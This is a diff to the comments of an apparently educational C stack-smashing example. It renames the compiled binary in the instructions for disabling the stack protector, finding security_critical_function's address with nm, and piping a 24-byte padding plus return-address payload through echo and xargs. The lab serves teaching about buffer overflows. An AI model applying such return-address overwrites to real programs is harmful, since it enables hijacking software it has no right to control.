@@ -11,7 +11,7 @@
 //    Next we compile without the stack protector, and we create a static
 //    binary to have security_critical_function at an easily identifiable
 //    location:
-//    gcc -fno-stack-protector listing3.c -g -static -o prog
+//    gcc -fno-stack-protector stack-smashing.c -g -static -o stack-smashing
 //
 //    Keep in mind that each time you modify and recompile the program, the
 //    memory layout will change and you have to redo steps 2 and onwards
@@ -55,7 +55,7 @@
 //    of padding, followed by the value we want to overwrite the return address
 //    with, i.e. the address of security_critical_function. We can find it
 //    easily:
-//    nm prog | grep security_critical_function
+//    nm stack-smashing | grep security_critical_function
 //
 //    In my case it is at 0x401c8d:
 //    0000000000401c8d T security_critical_function
@@ -67,7 +67,7 @@
 //    so we use echo -e to generate bytes than we feed these as the command
 //    line parameter to our target using xargs:
 //
-//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x8d\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./prog
+//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x8d\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./stack-smashing
 //
 //    Notice how we have 24 bytes of garbage (\x11) and then the address of
 //    security_critical_function that will overwrite the return address:
